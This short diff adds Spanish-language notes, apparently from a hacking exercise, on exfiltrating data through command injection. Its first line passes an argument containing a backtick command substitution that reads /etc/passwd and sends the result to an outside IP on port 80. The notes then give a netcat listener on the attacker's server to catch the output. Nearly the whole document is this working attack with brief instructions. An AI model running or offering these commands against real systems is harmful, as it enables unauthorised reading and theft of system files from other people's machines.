@@ -1,0 +1,8 @@
+-h 54.234.42.47 -p 80 "`cat /etc/passwd`"
+
+El server tiene que ser una ip no un nombre de dominio y el output se redirige ahi,
+en tu server tendras que aplicar:
+
+nc -l -p 80 > output
+
+Y el output es el resultado como tal
